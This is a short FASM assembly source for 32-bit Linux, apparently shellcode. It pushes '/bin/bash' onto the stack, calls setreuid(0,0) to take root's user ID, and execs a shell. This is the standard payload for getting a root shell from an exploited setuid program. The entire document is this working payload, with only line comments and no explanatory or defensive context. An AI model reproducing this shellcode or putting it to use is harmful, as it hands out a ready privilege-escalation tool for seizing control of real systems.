format elf executable
entry start

start:
    ; Save all registers
    pushad

    ; Save frame pointer
    push ebp
    mov ebp, esp

    ; NULL terminator
    xor eax, eax
    push eax

    ; One byte
    sub esp, 1
    mov byte[esp], 68h

    push 7361622fh
    push 6e69622fh
    ; "/bin/bash\0"
    ; 10 bytes

    ; setreuid
    mov eax, 70
    xor ebx, ebx
    xor ecx, ecx
    int 0x80

    ; execve
    mov eax, 11
    lea ebx, [esp]
    xor ecx, ecx
    int 0x80

    mov esp, ebp
    pop ebp

    popad

    ; Exit
    mov eax, 1
    xor ebx, ebx
    int 0x80
